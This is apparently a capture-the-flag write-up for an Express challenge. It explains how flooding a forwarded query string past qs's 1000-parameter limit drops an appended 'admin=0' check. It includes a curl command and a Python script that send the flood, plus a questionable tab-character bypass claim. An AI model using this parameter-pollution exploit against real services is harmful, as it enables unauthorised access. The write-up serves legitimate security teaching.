## 🧠 My Best Friend

---

### 📜 Description

Dreamee has created a web service that greets everything she says — but something weird has been happening lately.

Flag format: `null{...}`  
Tech stack: **Express** + **qs** module.

---

### 🔍 Code Analysis

The service exposes the following endpoints:

- `GET /`: Returns a static HTML file.
- `POST /greet`: Sends a message to `/api` as a query string.
- `GET /api`: Returns the flag if `req.query.admin != 0`.

However, the `/greet` endpoint **sanitizes** inputs to prevent tampering:

```javascript
if (
  msg.includes('admin') || msg.includes('\\') || msg.includes('%') ||
  msg.includes('?') || msg.includes(';') || msg.includes('#') ||
  msg.includes('[') || msg.includes(']')
) return res.json({ result: 'Not allowed character' });
```

So `admin=1`, `?`, `%`, and other common attack vectors are **filtered**.

---

### 💥 Vulnerability

Despite filtering, the backend builds the request like this:

```javascript
const fullUrl = `http://localhost:3000/api?msg=${msg}&admin=0`;
const resp = await axios.get(fullUrl);
```

The key insight: The server uses **qs** module (default in Express) to parse query strings.

By default, `qs` only parses up to **1000 parameters**. If we flood it with parameters like:

```
1&1&1&1&... (more than 1000 times)
```

The trailing `admin=0` will be **ignored** during parsing.

Thus, `req.query.admin` becomes `undefined`, and:

```javascript
Number(undefined) !== 0 // evaluates to true
```

So the condition is satisfied and the flag is returned.

---

### 🚀 Exploit

```bash
curl -X POST http://host/greet \
  -d "msg=$(python3 -c 'print("&1"*1001)')"
```

Or in Python (e.g. via requests):

```python
import requests

url = "http://host/greet"
payload = "&1" * 1001
res = requests.post(url, data={"msg": payload})
print(res.text)
```

💡 This causes the server to call:

```
http://localhost:3000/api?&1&1&1&...&admin=0
```

But `admin=0` is ignored due to the 1000 parameter limit, so `admin` becomes `undefined`.

---

### ⚠️ Unintended Bypass (Unicode)

An unintended solution: inject `admin` using **non-blocked unicode characters**, e.g. tab:

```
1&ad[TAB]min=1
```

The tab character (`%09`) is **not filtered**, so `admin=1` is parsed successfully.

---

### 📌 Key Takeaways

- Express uses the `qs` module under the hood to parse query strings.
- The default `parameterLimit` in `qs` is 1000 — anything beyond is ignored.
- Query pollution is possible via parameter overloading.
- Input filtering isn't always enough if the backend logic is vulnerable.

---

### 🔗 Reference

- `qs` GitHub: https://github.com/ljharb/qs  
  > “By default, qs will only parse up to 1000 parameters.”
